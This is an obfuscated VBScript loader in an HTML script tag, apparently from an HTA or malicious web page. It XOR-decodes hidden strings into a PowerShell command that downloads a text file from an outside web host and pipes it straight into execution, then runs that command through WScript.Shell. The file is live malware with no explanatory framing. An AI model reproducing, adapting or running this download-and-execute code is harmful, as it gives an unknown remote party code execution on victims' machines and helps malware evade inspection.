<script language="vBsCrIpT">
Dim second26
second26 = ""


Dim toddler62
For toddler62 = 1 To Len("tksavwlahh$mvi$lpptw>++eggajpsahhjaww*gki+pawp+e`rejga*p|p$x$ma|")
        second26 = second26 & Chr(Asc(Mid("tksavwlahh$mvi$lpptw>++eggajpsahhjaww*gki+pawp+e`rejga*p|p$x$ma|", toddler62, 1)) Xor 4)
Next


Dim move39
move39 = ""

For toddler62 = 1 To Len("SWgvmtp*Wlahh")
        move39 = move39 & Chr(Asc(Mid("SWgvmtp*Wlahh", toddler62, 1)) Xor 4)
Next

Set canal65 = CreateObject (move39)
canal65.Run(second26)
</script>
